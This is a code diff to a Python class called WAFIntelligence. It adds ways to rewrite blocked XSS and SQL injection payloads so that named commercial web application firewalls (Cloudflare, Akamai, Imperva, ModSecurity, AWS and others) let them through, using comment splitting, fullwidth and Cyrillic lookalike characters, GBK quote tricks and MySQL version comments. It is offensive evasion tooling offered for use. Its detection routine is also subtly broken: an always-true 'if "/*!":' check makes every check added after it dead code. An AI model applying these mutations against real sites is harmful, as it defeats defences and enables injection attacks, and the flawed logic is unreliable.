@@ -202,21 +202,51 @@ class WAFIntelligence:
             mutations.append(blocked_payload.replace(" ", "%09"))  # tab
             mutations.append(blocked_payload.replace(" ", "%0a"))  # newline
 
+        # --- HTML comment splitting (XSS) ---
+        comment_split = self._html_comment_split(blocked_payload)
+        if comment_split != blocked_payload:
+            mutations.append(comment_split)
+
+        # --- Fullwidth Unicode ---
+        fullwidth = self._fullwidth_unicode(blocked_payload)
+        if fullwidth != blocked_payload:
+            mutations.append(fullwidth)
+
         # --- WAF-specific mutations ---
         if "cloudflare" in waf_key:
-            # Cloudflare is weak against double encoding + unicode normalization
+            # Cloudflare: double encoding, unicode normalization, fullwidth, confusables
             mutations.append(self._overlong_utf8(blocked_payload))
+            mutations.append(self._unicode_confusables(blocked_payload))
         elif "akamai" in waf_key:
-            # Akamai: null bytes + chunked
+            # Akamai: null bytes, chunked, fullwidth
             mutations.append(blocked_payload.replace(" ", "%00"))
             mutations.append("%0d%0a".join(blocked_payload[i:i + 3] for i in range(0, len(blocked_payload), 3)))
         elif "imperva" in waf_key or "incapsula" in waf_key:
-            # Imperva: chunk split + tab substitution
+            # Imperva: chunk split, HTML comment split, tab substitution
             mutations.append("%0d%0a".join(blocked_payload[i:i + 4] for i in range(0, len(blocked_payload), 4)))
+            mutations.append(self._html_comment_split(blocked_payload))
         elif "modsecurity" in waf_key:
-            # ModSecurity: overlong UTF-8 + backslash tricks
+            # ModSecurity: overlong UTF-8, backslash tricks, MySQL version comments, GBK
             mutations.append(self._overlong_utf8(blocked_payload))
             mutations.append(blocked_payload.replace("'", "\\'").replace('"', '\\"'))
+            mutations.append(blocked_payload.replace("'", "%bf%27"))
+            mutations.append(self._mysql_version_comment(blocked_payload))
+        elif "aws" in waf_key:
+            # AWS WAF: newlines, double encoding, case randomization
+            mutations.append(blocked_payload.replace(" ", "%0a"))
+            mutations.append(self._unicode_confusables(blocked_payload))
+        elif "sucuri" in waf_key:
+            # Sucuri: double encoding, HTML comment split, unicode confusables
+            mutations.append(self._html_comment_split(blocked_payload))
+            mutations.append(self._unicode_confusables(blocked_payload))
+        elif "barracuda" in waf_key:
+            # Barracuda: null bytes, vertical tab
+            mutations.append(blocked_payload.replace(" ", "%0b"))
+            mutations.append(self._null_byte_inject(blocked_payload))
+        elif "f5" in waf_key or "big-ip" in waf_key:
+            # F5 BIG-IP: overlong UTF-8, null bytes
+            mutations.append(self._overlong_utf8(blocked_payload))
+            mutations.append(blocked_payload.replace(" ", "%00"))
 
         # Deduplicate while preserving order, skip if identical to original
         seen = {blocked_payload}
@@ -524,6 +554,54 @@ class WAFIntelligence:
         return mutations
 
     @staticmethod
+    def _html_comment_split(payload: str) -> str:
+        """Break tags with HTML comments: <script> -> <scr<!---->ipt>."""
+        replacements = {
+            "script": "scr<!---->ipt",
+            "iframe": "ifr<!---->ame",
+            "onload": "onlo<!---->ad",
+            "onerror": "oner<!---->ror",
+        }
+        result = payload
+        for old, new in replacements.items():
+            result = re.sub(re.escape(old), new, result, flags=re.IGNORECASE, count=1)
+        return result
+
+    @staticmethod
+    def _fullwidth_unicode(payload: str) -> str:
+        """Replace key chars with fullwidth equivalents."""
+        fw_map = {"<": "\uff1c", ">": "\uff1e", "(": "\uff08", ")": "\uff09",
+                  "'": "\uff07", '"': "\uff02", "/": "\uff0f"}
+        result = ""
+        for c in payload:
+            result += fw_map.get(c, c)
+        return result
+
+    @staticmethod
+    def _unicode_confusables(payload: str) -> str:
+        """Replace letters with visually similar Unicode (Cyrillic lookalikes)."""
+        confusables = {
+            "a": "\u0430", "c": "\u0441", "e": "\u0435", "o": "\u043e",
+            "p": "\u0440", "s": "\u0455", "i": "\u0456", "x": "\u0445",
+        }
+        result = ""
+        for c in payload:
+            if c.lower() in confusables and random.random() > 0.5:
+                result += confusables[c.lower()]
+            else:
+                result += c
+        return result
+
+    @staticmethod
+    def _mysql_version_comment(payload: str) -> str:
+        """Wrap SQL keywords in MySQL version comments: UNION -> /*!50000UNION*/."""
+        keywords = ["UNION", "SELECT", "FROM", "WHERE", "INSERT", "UPDATE", "DELETE"]
+        result = payload
+        for kw in keywords:
+            result = re.sub(rf"\b{kw}\b", f"/*!50000{kw}*/", result, flags=re.IGNORECASE, count=1)
+        return result
+
+    @staticmethod
     def _overlong_utf8(payload: str) -> str:
         """Overlong UTF-8 encoding to bypass character-based WAF filters."""
         result = ""
@@ -543,12 +621,16 @@ class WAFIntelligence:
     @staticmethod
     def _detect_technique(payload: str) -> str | None:
         """Detect which bypass technique a payload uses."""
+        if "<!---->" in payload:
+            return "html_comment_split"
         if "/**/" in payload:
             return "comment_injection"
         if "%00" in payload:
             return "null_byte"
         if "%0a" in payload.lower() or "%0d" in payload.lower():
             return "newline_injection"
+        if "%0b" in payload.lower() or "%0c" in payload.lower():
+            return "whitespace_alternative"
         if "%09" in payload:
             return "tab_substitution"
         if "\\u" in payload:
@@ -557,8 +639,30 @@ class WAFIntelligence:
             return "double_url_encoding"
         if "%c0" in payload.lower():
             return "overlong_utf8"
+        if "%bf%27" in payload.lower() or "%bf%22" in payload.lower():
+            return "gbk_multibyte"
+        if "/*!50000" in payload or "/*!" in payload:
+            return "mysql_version_comment"
         if "/*!":
             return "mysql_inline_comment"
+        # Fullwidth Unicode detection (chars in U+FF00-U+FFEF range)
+        if any(0xFF00 <= ord(c) <= 0xFFEF for c in payload):
+            return "fullwidth_unicode"
+        # Zero-width character detection
+        if "\u200b" in payload or "\u200c" in payload or "\ufeff" in payload:
+            return "zero_width_chars"
+        # Unicode confusable detection (Cyrillic lookalikes in U+0400-U+04FF)
+        if any(0x0400 <= ord(c) <= 0x04FF for c in payload):
+            return "unicode_confusables"
+        # ${IFS} or $IFS$9 detection
+        if "${IFS}" in payload or "$IFS" in payload:
+            return "ifs_bypass"
+        # HPP marker detection
+        if "HPP_SPLIT:" in payload:
+            return "http_param_pollution"
+        # Content-type marker
+        if "CT_JSON:" in payload:
+            return "content_type_confusion"
         # Mixed case detection
         alpha_chars = [c for c in payload if c.isalpha()]
         if alpha_chars:
